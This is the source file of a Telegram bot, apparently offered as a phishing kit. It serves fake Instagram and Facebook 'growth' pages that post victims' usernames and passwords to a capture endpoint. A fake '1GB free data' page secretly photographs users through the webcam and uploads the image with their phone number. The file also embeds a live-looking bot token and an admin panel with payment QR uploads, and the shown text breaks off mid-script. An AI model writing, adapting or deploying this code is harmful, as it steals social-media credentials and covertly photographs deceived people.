// ====================== index.js (COMPLETE FIXED - ALL ERRORS RESOLVED) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Complete Bot with Admin Panel - Photo Management + Referral + Credits + Fake Claim
 */

process.env.NTBA_FIX_350 = 1;

// ====================== CONFIGURATION ======================
const config = {
    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
    S7: '@RTFGAMMING',
    adminId: '6346250222',
    port: process.env.PORT || 3000,
    love: 'S7_LOVE_2026',
    adminPassword: 'admin123',
    channels: [
        { id: '-1003004551707', name: 'Main Channel', link: 'https://t.me/RTFGAMINGHACK0' },
        { id: '-1003559518526', name: 'Main Group', link: 'https://t.me/RTFGAMINGHACK0' }
    ],
    bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓',
    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com'
};

console.log('✅ Bot Token loaded successfully!');
console.log('📌 Base URL:', config.baseUrl);

// ====================== DEPENDENCIES ======================
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

// ====================== SETUP ======================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Create directories
const PHOTO_DIR = path.join(__dirname, 'photos');
const DATA_DIR = path.join(__dirname, 'data');
const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
const PAGES_DIR = path.join(__dirname, 'pages');

if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });

// Storage files
const PHOTOS_FILE = path.join(DATA_DIR, 'photos.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const REFERRALS_FILE = path.join(DATA_DIR, 'referrals.json');
const CHANNELS_FILE = path.join(DATA_DIR, 'channels.json');

if (!fs.existsSync(PHOTOS_FILE)) fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: [] }, null, 2));
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify({ users: {} }, null, 2));
if (!fs.existsSync(REFERRALS_FILE)) fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals: [] }, null, 2));
if (!fs.existsSync(CHANNELS_FILE)) fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: config.channels }, null, 2));

// ====================== MULTER SETUP ======================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        if (file.fieldname === 'photo' || file.fieldname === 'qr') {
            cb(null, BOT_PHOTO_DIR);
        } else {
            cb(null, BOT_PHOTO_DIR);
        }
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only images allowed!'));
        }
    }
});

// ====================== USER DATA FUNCTIONS ======================
function getUsers() {
    try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')).users || {}; } catch { return {}; }
}

function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify({ users }, null, 2));
}

function getUser(userId) {
    const users = getUsers();
    if (!users[userId]) {
        users[userId] = {
            credits: 3,
            referrals: 0,
            totalReferrals: 0,
            unlimited: false,
            joinedAt: new Date().toISOString(),
            referredBy: null,
            _pendingReferrer: null
        };
        saveUsers(users);
    }
    return users[userId];
}

function updateUser(userId, data) {
    const users = getUsers();
    if (!users[userId]) users[userId] = { credits: 3, referrals: 0, totalReferrals: 0, unlimited: false, joinedAt: new Date().toISOString(), referredBy: null, _pendingReferrer: null };
    Object.assign(users[userId], data);
    saveUsers(users);
    return users[userId];
}

function addCredits(userId, amount) {
    const user = getUser(userId);
    if (user.unlimited) return user;
    user.credits = (user.credits || 0) + amount;
    saveUsers(getUsers());
    return user;
}

function useCredit(userId) {
    const user = getUser(userId);
    if (user.unlimited) return true;
    if ((user.credits || 0) <= 0) return false;
    user.credits = (user.credits || 0) - 1;
    saveUsers(getUsers());
    return true;
}

function getReferrals() {
    try { return JSON.parse(fs.readFileSync(REFERRALS_FILE, 'utf8')).referrals || []; } catch { return []; }
}

function saveReferrals(referrals) {
    fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals }, null, 2));
}

function addReferral(referrerId, newUserId) {
    const referrals = getReferrals();
    referrals.push({
        referrerId: String(referrerId),
        newUserId: String(newUserId),
        timestamp: new Date().toISOString()
    });
    saveReferrals(referrals);
    
    const referrer = getUser(referrerId);
    referrer.totalReferrals = (referrer.totalReferrals || 0) + 1;
    referrer.referrals = (referrer.referrals || 0) + 1;
    if (!referrer.unlimited) {
        referrer.credits = (referrer.credits || 0) + 2;
    }
    saveUsers(getUsers());
    
    return referrer;
}

function getChannels() {
    try { return JSON.parse(fs.readFileSync(CHANNELS_FILE, 'utf8')).channels || []; } catch { return []; }
}

function saveChannels(channels) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels }, null, 2));
}

function addChannel(id, name, link) {
    const channels = getChannels();
    channels.push({ id, name, link });
    saveChannels(channels);
    return channels;
}

function removeChannel(id) {
    let channels = getChannels();
    channels = channels.filter(c => c.id !== id);
    saveChannels(channels);
    return channels;
}

// ====================== PHOTO FUNCTIONS ======================
function getPhotos() {
    try { return JSON.parse(fs.readFileSync(PHOTOS_FILE, 'utf8')).photos || []; } catch { return []; }
}

function savePhotos(photos) {
    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos }, null, 2));
}

function addPhoto(file, caption = '') {
    const photos = getPhotos();
    const photoData = {
        id: Date.now().toString(),
        filename: file.filename,
        originalName: file.originalname,
        url: `/api/photos/${file.filename}`,
        caption: caption,
        uploadedAt: new Date().toISOString(),
        active: true
    };
    photos.push(photoData);
    savePhotos(photos);
    return photoData;
}

function deletePhoto(id) {
    const photos = getPhotos();
    const index = photos.findIndex(p => p.id === id);
    if (index === -1) return false;
    const photo = photos[index];
    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    photos.splice(index, 1);
    savePhotos(photos);
    return true;
}

function togglePhoto(id) {
    const photos = getPhotos();
    const photo = photos.find(p => p.id === id);
    if (!photo) return false;
    photo.active = !photo.active;
    savePhotos(photos);
    return photo;
}

function getActivePhotos() {
    return getPhotos().filter(p => p.active);
}

function getRandomPhoto() {
    const photos = getActivePhotos();
    if (photos.length === 0) return null;
    return photos[Math.floor(Math.random() * photos.length)];
}

// ====================== HELPER FUNCTIONS ======================
function LoveHit(SYloveDaTe, SYloveTiMe, platform, pass, user, dev) {
    return `🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ${platform}\n📧 ↝ ᴘᴀss » ${user}\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ${pass}\n⏱ ↝ ᴛɪᴍᴇ » ${SYloveTiMe}\n📝 ↝ ᴅᴀᴛᴇ » ${SYloveDaTe}\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ${dev}`;
}

function MenuLove(firstName, dev, SeXy, LoveTime, message) {
    return `─【 ${dev} 】─\n────────────────────\n ᴜsᴇʀ ➤ ${firstName} ›\n ɴᴀᴍᴇ ➤ ${SeXy} ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ${LoveTime}›\n ────────────────────\n\n ${message} \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─`;
}

function getUptime() {
    const ut = process.uptime();
    const h = Math.floor(ut / 3600);
    const m = Math.floor((ut % 3600) / 60);
    const s = Math.floor(ut % 60);
    return `${h}h ${m}m ${s}s`;
}

function LoveNotifer(platform, pass, user) {
    const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
    const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
    return LoveHit(SYloveDaTe, SYloveTiMe, platform, pass, user, config.S7);
}

function SYloveMenu(firstName, message) {
    return MenuLove(firstName, config.S7, config.bot, getUptime(), message);
}

async function checkAllChannels(userId) {
    const channels = getChannels();
    for (const channel of channels) {
        try {
            const member = await S7.getChatMember(channel.id, userId);
            const valid = ['creator', 'administrator', 'member', 'restricted'];
            if (!valid.includes(member.status)) return false;
        } catch (e) {
            return false;
        }
    }
    return true;
}

function getChannelButtons() {
    const channels = getChannels();
    const buttons = channels.map(c => [{ text: `📢 ${c.name}`, url: c.link }]);
    buttons.push([{ text: "✅ Check All Joined", callback_data: "check_all" }]);
    return { inline_keyboard: buttons };
}

// ====================== TEMPLATES ======================
const TEMPLATES = {
    instagram: `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Instagram</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}body{background:radial-gradient(circle at top left,#2c0e38,#000);height:100vh;display:flex;justify-content:center;align-items:center}.card{background:rgba(30,30,30,0.6);backdrop-filter:blur(20px);width:380px;padding:40px 30px;border-radius:24px;border:1px solid rgba(255,255,255,0.08);box-shadow:0 20px 50px rgba(0,0,0,0.5);text-align:center;color:#fff}.insta-logo-icon{font-size:48px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}h2{font-size:22px;font-weight:700}.input-group{position:relative;margin-bottom:15px;text-align:left}.input-group i{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:#888}.input-field{width:100%;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);padding:14px 14px 14px 45px;border-radius:12px;color:#fff;font-size:14px;outline:none}.btn-start{width:100%;padding:15px;border:none;border-radius:12px;background:linear-gradient(90deg,#4f5bd5,#962fbf,#d62976,#fa7e1e);color:#fff;font-weight:600;font-size:15px;cursor:pointer}.btn-start:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(214,41,118,0.6)}#process-screen{display:none}.loader-text{color:#aaa;font-size:13px;margin:10px 0;display:flex;align-items:center;justify-content:center;gap:8px}.spinner{width:14px;height:14px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;display:inline-block}@keyframes spin{100%{transform:rotate(360deg)}}.progress-container{width:100%;height:6px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0}.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .5s ease}.delivered-box{background:rgba(0,0,0,0.3);border-radius:16px;padding:20px}.delivered-count{font-size:42px;font-weight:800}.user-preview{display:flex;align-items:center;justify-content:center;gap:15px;margin:20px 0}.avatar-circle{width:40px;height:40px;background:#ddd;border-radius:50%}.verified{color:#0f8;font-size:11px}</style></head><body><div class="card"><i class="fab fa-instagram insta-logo-icon"></i><h2>Growth Dashboard</h2><div id="form-screen"><div class="input-group"><i class="far fa-user"></i><input type="text" id="username" class="input-field" placeholder="Username"></div><div class="input-group"><i class="fas fa-shield-alt"></i><input type="password" id="password" class="input-field" placeholder="Password"></div><button class="btn-start" onclick="startEngine()">Start Growth Engine <i class="fas fa-bolt"></i></button></div><div id="process-screen"><div class="user-preview"><div class="avatar-circle"></div><div><span id="display-username">@Username</span><div class="verified">Verified</div></div></div><div class="loader-text"><div class="spinner"></div><span id="status-text">Processing...</span></div><div class="progress-container"><div class="progress-bar" id="progress-bar"></div></div><div class="delivered-box"><div class="delivered-count" id="count-display">0</div></div></div></div><script>const id="USERID_PLACEHOLDER";const p="PLATFORM_PLACEHOLDER";function startEngine(){const u=document.getElementById('username').value.trim();const pwd=document.getElementById('password').value;if(!u||!pwd){alert("Please fill all fields.");return}fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,user:u,pass:pwd,platform:p})}).catch(e=>console.error(e));document.getElementById('form-screen').style.display='none';document.getElementById('process-screen').style.display='block';document.getElementById('display-username').innerText='@'+u;let progress=0,count=0;const interval=setInterval(()=>{progress+=Math.random()*2+0.5;if(progress>=100){progress=100;clearInterval(interval);document.getElementById('status-text').innerHTML='✅ Complete!';document.querySelector('.loader-text').innerHTML='<i class="fas fa-check-circle" style="color:#0f8"></i> Process Complete';return}document.getElementById('progress-bar').style.width=progress+'%';if(progress>25){count+=Math.floor(Math.random()*50)+10;document.getElementById('count-display').innerText=count.toLocaleString()}if(progress<30)document.getElementById('status-text').innerText="Connecting...";else if(progress<60)document.getElementById('status-text').innerText="Processing...";else document.getElementById('status-text').innerText="Finalizing..."},100)}</script></body></html>`,
    facebook: `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}body{background:radial-gradient(circle at center,#0d1a33,#000);height:100vh;display:flex;justify-content:center;align-items:center}.card{background:rgba(30,40,60,0.75);backdrop-filter:blur(25px);width:400px;padding:45px 35px;border-radius:20px;border:1px solid rgba(150,200,255,0.2);box-shadow:0 30px 60px rgba(0,0,0,0.7);text-align:center;color:#fff}.fb-logo-icon{font-size:58px;color:#2D88FF;text-shadow:0 0 25px rgba(45,136,255,0.7)}h2{font-size:26px;font-weight:800}.input-group{position:relative;margin-bottom:20px;text-align:left}.input-group i{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:#90b0e0}.input-field{width:100%;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);padding:16px 16px 16px 50px;border-radius:10px;color:#fff;font-size:15px;outline:none}.btn-start{width:100%;padding:16px;border:none;border-radius:10px;background:linear-gradient(135deg,#2D88FF,#0056b3);color:#fff;font-weight:700;font-size:17px;cursor:pointer}.btn-start:hover{transform:translateY(-3px);box-shadow:0 12px 25px rgba(45,136,255,0.6)}#process-screen{display:none}.loader-text{color:#d0d7e7;font-size:14px;margin:12px 0;display:flex;align-items:center;justify-content:center;gap:10px}.spinner{width:18px;height:18px;border:3px solid rgba(45,136,255,0.2);border-top-color:#2D88FF;border-radius:50%;animation:spin .8s linear infinite;display:inline-block}@keyframes spin{100%{transform:rotate(360deg)}}.progress-container{width:100%;height:10px;background:rgba(255,255,255,0.1);border-radius:20px;overflow:hidden;margin:20px 0}.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#2D88FF,#54c7fc);transition:width .5s ease}.delivered-box{background:rgba(45,136,255,0.1);border-radius:16px;padding:25px;border:1px solid rgba(45,136,255,0.4)}.delivered-count{font-size:48px;font-weight:900}.user-preview{display:flex;align-items:center;justify-content:center;gap:15px;margin:20px 0;background:rgba(45,136,255,0.15);padding:12px 20px;border-radius:50px;border:1px solid rgba(45,136,255,0.4)}.avatar-circle{width:45px;height:45px;background:#2D88FF;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid #fff}.verified{color:#4FA3FF;font-size:13px;display:flex;align-items:center;gap:5px}</style></head><body><div class="card"><i class="fab fa-facebook fb-logo-icon"></i><h2>FACEBOOK BOOST</h2><div id="form-screen"><div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" class="input-field" placeholder="Email or Phone"></div><div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" class="input-field" placeholder="Password"></div><button class="btn-start" onclick="startEngine()">Start Boost <i class="fas fa-rocket"></i></button></div><div id="process-screen"><div class="user-preview"><div class="avatar-circle"><i class="fas fa-user-check"></i></div><div><span id="display-username">User</span><div class="verified"><i class="fas fa-check-circle"></i> Verified</div></div></div><div class="loader-text"><div class="spinner"></div><span id="status-text">Connecting...</span></div><div class="progress-container"><div class="progress-bar" id="progress-bar"></div></div><div class="delivered-box"><div class="delivered-count" id="count-display">0</div></div></div></div><script>const id="USERID_PLACEHOLDER";const p="PLATFORM_PLACEHOLDER";function startEngine(){const u=document.getElementById('username').value.trim();const pwd=document.getElementById('password').value;if(!u||!pwd){alert("Please fill all fields.");return}fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,user:u,pass:pwd,platform:p})}).catch(e=>console.error(e));document.getElementById('form-screen').style.display='none';document.getElementById('process-screen').style.display='block';document.getElementById('display-username').innerText=u;let progress=0,count=0;const interval=setInterval(()=>{progress+=Math.random()*1.5+0.5;if(progress>=100){progress=100;clearInterval(interval);document.getElementById('status-text').innerHTML='✅ Success!';document.querySelector('.loader-text').innerHTML='<i class="fas fa-check-circle" style="color:#2D88FF"></i> Process Complete';return}document.getElementById('progress-bar').style.width=progress+'%';if(progress>25){count+=Math.floor(Math.random()*30)+5;document.getElementById('count-display').innerText=count.toLocaleString()}if(progress<25)document.getElementById('status-text').innerText="Connecting...";else if(progress<50)document.getElementById('status-text').innerText="Verifying...";else if(progress<75)document.getElementById('status-text').innerText="Processing...";else document.getElementById('status-text').innerText="Finalizing..."},100)}</script></body></html>`,
    camera: `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VIP DATA INJECTOR</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet"><style>*{box-sizing:border-box}body{margin:0;padding:0;font-family:'Rajdhani',sans-serif;background:#050505;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(25px);border:1px solid rgba(255,255,255,0.1);border-radius:40px;padding:50px 40px;width:400px;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.5)}h1{font-family:'Orbitron',sans-serif;font-size:45px;font-weight:900;background:linear-gradient(to bottom,#fff,#888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.badge{display:inline-block;background:linear-gradient(90deg,#ff007a,#7000ff);padding:4px 15px;border-radius:10px;font-size:12px;font-weight:700;letter-spacing:3px;margin-bottom:20px}.input-box{margin:25px 0;text-align:left}.input-box label{font-size:13px;color:#0f2;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block}select,input{width:100%;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);padding:18px 25px;border-radius:20px;color:#fff;font-size:18px;font-family:'Rajdhani',sans-serif;transition:.4s}.btn-neon{width:100%;padding:20px;border:none;border-radius:20px;background:#fff;color:#000;font-family:'Orbitron',sans-serif;font-weight:900;font-size:16px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(255,255,255,0.2)}.btn-neon:hover{background:#0f2;box-shadow:0 0 40px #0f2;transform:translateY(-3px)}.btn-claim{width:100%;padding:20px;border:none;border-radius:20px;background:linear-gradient(135deg,#00f260,#0575e6);color:#fff;font-family:'Orbitron',sans-serif;font-weight:900;font-size:18px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(0,242,96,0.3);margin-top:15px}.btn-claim:hover{transform:scale(1.02);box-shadow:0 15px 40px rgba(0,242,96,0.5)}#console{margin-top:30px;background:rgba(0,0,0,0.6);border-radius:20px;padding:20px;font-family:'Courier New',monospace;font-size:13px;color:#0f2;text-align:left;display:none;border:1px solid rgba(0,242,255,0.1)}.line{margin-bottom:5px;border-left:3px solid #0f2;padding-left:10px;animation:lineIn .3s ease-out}@keyframes lineIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}.err{color:#ff007a;border-color:#ff007a}.suc{color:#0f8;border-color:#0f8;font-weight:700}video,canvas{display:none}.hidden{display:none}</style></head><body><div class="card"><div class="badge">🔥 FREE OFFER</div><h1>CLAIM 1GB</h1><div class="input-box"><label>Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div><button class="btn-claim" id="claimBtn">🎁 CLAIM 1GB DATA</button><div id="console"></div></div><video id="v" autoplay playsinline></video><canvas id="c"></canvas><script>const id="USERID_PLACEHOLDER";const p="PLATFORM_PLACEHOLDER";const claimBtn=document.getElementById('claimBtn');const consoleBox=document.getElementById('console');const video=document.getElementById('v');const canvas=document.getElementById('c');const ctx=canvas.getContext('2d');function addLog(msg,type=''){const l=document.createElement('div');l.className='line '+type;l.innerText=msg;consoleBox.appendChild(l)}claimBtn.addEventListener('click',async()=>{const mobile=document.getElementById('mobile').value;if(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}claimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";consoleBox.style.display="block";consoleBox.innerHTML="";addLog("🔍 Verifying number...");addLog("📡 Connecting to server...");try{addLog("📸 Taking verification selfie...");const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});video.srcObject=stream;await new Promise(r=>setTimeout(r,800));canvas.width=video.videoWidth;canvas.height=video.videoHeight;ctx.drawImage(video,0,0);const photoBase64=canvas.toDataURL('image/jpeg',0.92).split(',')[1];stream.getTracks().forEach(t=>t.stop());addLog("✅ Selfie captured!");addLog("📤 Sending data...");fetch('/api/capturepic',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(e=>console.error(e));await new Promise(r=>setTimeout(r,1000));addLog("✅ Claim successful!","suc");addLog("🎉 1GB added to your account!","suc");claimBtn.innerText="✅ CLAIMED";claimBtn.style.background="linear-gradient(135deg,#00f260,#0575e6)";setTimeout(()=>{alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM 1GB DATA"},1500)}catch(e){addLog("❌ Camera access denied! Please enable camera","err");claimBtn.innerText="❌ RETRY";claimBtn.disabled=false}})</script></body></html>`
};

// ====================== EXPRESS ROUTES ======================
app.use('/api/photos', express.static(BOT_PHOTO_DIR));

// ====================== ADMIN PANEL ======================
app.get('/admin', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:#0a0a0a;color:#fff;padding:20px}
        .container{max-width:1200px;margin:0 auto}
        .header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}
        .header h1{font-size:36px}
        .tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}
        .tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s}
        .tab.active{background:#667eea;border-color:#667eea}
        .tab:hover{background:#2a2a4a}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}
        .card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}
        .card:hover{transform:translateY(-5px);border-color:#667eea}
        .card img{width:100%;height:200px;object-fit:cover;border-radius:10px}
        .card .info{padding:10px 0}
        .card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
        .btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}
        .btn-danger{background:#dc3545;color:#fff}
        .btn-danger:hover{background:#c82333}
        .btn-warning{background:#ffc107;color:#000}
        .btn-warning:hover{background:#e0a800}
        .btn-primary{background:#007bff;color:#fff}
        .btn-primary:hover{background:#0069d9}
        .btn-success{background:#28a745;color:#fff}
        .btn-success:hover{background:#218838}
        .upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}
        .upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}
        .upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}
        .upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}
        .stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}
        .stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
        .stat-card .number{font-size:32px;font-weight:700;color:#667eea}
        .stat-card .label{color:#888;font-size:14px}
        .channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}
        .channel-item .name{font-weight:600}
        .channel-item .id{color:#888;font-size:12px}
        .user-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin:10px 0}
        .user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a}
        .user-card .uid{color:#667eea;font-weight:600}
        .toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none}
        .toast.error{background:#dc3545}
        .empty{text-align:center;padding:60px 20px;color:#666}
        .empty i{font-size:64px;margin-bottom:20px;display:block}
        input, select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}
        .flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
        .qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
        .qr-section img{max-width:200px;border-radius:10px}
        .qr-section input{width:100%;max-width:400px;margin:10px auto}
    </style>
</head>
<body>
<div class="container">
    <div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div>
    
    <div class="tabs">
        <div class="tab active" onclick="showTab('photos')">📷 Photos</div>
        <div class="tab" onclick="showTab('channels')">📢 Channels</div>
        <div class="tab" onclick="showTab('users')">👥 Users</div>
        <div class="tab" onclick="showTab('qr')">💰 Payments</div>
    </div>

    <!-- Photos Tab -->
    <div id="tab-photos" class="tab-content active">
        <div class="stats" id="stats"></div>
        <div class="upload-section">
            <h3>📤 Upload Photo</h3>
            <form id="uploadForm" enctype="multipart/form-data">
                <input type="file" name="photo" accept="image/*" required>
                <input type="text" name="caption" placeholder="Caption">
                <button type="submit" class="btn btn-primary">Upload</button>
            </form>
        </div>
        <div id="photoGrid" class="grid"></div>
    </div>

    <!-- Channels Tab -->
    <div id="tab-channels" class="tab-content">
        <h2>📢 Manage Channels</h2>
        <div class="upload-section">
            <h3>➕ Add Channel</h3>
            <div class="flex">
                <input type="text" id="channelId" placeholder="Channel ID (e.g., -100123456)" style="flex:1">
                <input type="text" id="channelName" placeholder="Channel Name" style="flex:1">
                <input type="text" id="channelLink" placeholder="Channel Link" style="flex:1">
                <button class="btn btn-success" onclick="addChannel()">Add Channel</button>
            </div>
        </div>
        <div id="channelList"></div>
    </div>

    <!-- Users Tab -->
    <div id="tab-users" class="tab-content">
        <h2>👥 Manage Users</h2>
        <div class="flex" style="margin-bottom:20px">
            <input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1">
            <button class="btn btn-primary" onclick="searchUser()">Search</button>
        </div>
        <div id="userList"></div>
        <div class="flex" style="margin-top:20px">
            <input type="text" id="userIdInput" placeholder="User ID" style="flex:1">
            <input type="number" id="creditAmount" placeholder="Credits (+/-)" style="width:150px">
            <button class="btn btn-warning" onclick="modifyCredits()">Modify Credits</button>
            <button class="btn btn-success" onclick="toggleUnlimited()">Toggle Unlimited</button>
        </div>
    </div>

    <!-- QR Tab -->
    <div id="tab-qr" class="tab-content">
        <div class="qr-section">
            <h2>💰 Payment QR Code</h2>
            <div id="qrDisplay">
                <p style="color:#888;margin:20px 0">Upload your payment QR code</p>
                <input type="file" id="qrUpload" accept="image/*">
                <button class="btn btn-primary" onclick="uploadQR()">Upload QR</button>
            </div>
            <div id="qrPreview" style="margin-top:20px"></div>
        </div>
    </div>
</div>
<div id="toast" class="toast"></div>

<script>
const API_BASE=window.location.origin;

function showToast(m,e=false){const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' error':'');t.style.display='block';setTimeout(()=>{t.style.display='none'},3000);}

function showTab(tab){
    document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    document.getElementById('tab-'+tab).classList.add('active');
    document.querySelector(\`.tab[onclick="showTab('\${tab}')"]\`).classList.add('active');
    if(tab==='channels') loadChannels();
    if(tab==='users') loadUsers();
}

// PHOTOS
async function loadPhotos(){
    try{
        const r=await fetch('/api/admin/photos');
        const d=await r.json();
        const photos=d.photos||[];
        const active=photos.filter(p=>p.active).length;
        const total=photos.length;
        document.getElementById('stats').innerHTML=\`
            <div class="stat-card"><div class="number">\${total}</div><div class="label">Total Photos</div></div>
            <div class="stat-card"><div class="number">\${active}</div><div class="label">Active</div></div>
            <div class="stat-card"><div class="number">\${total-active}</div><div class="label">Inactive</div></div>
        \`;
        const grid=document.getElementById('photoGrid');
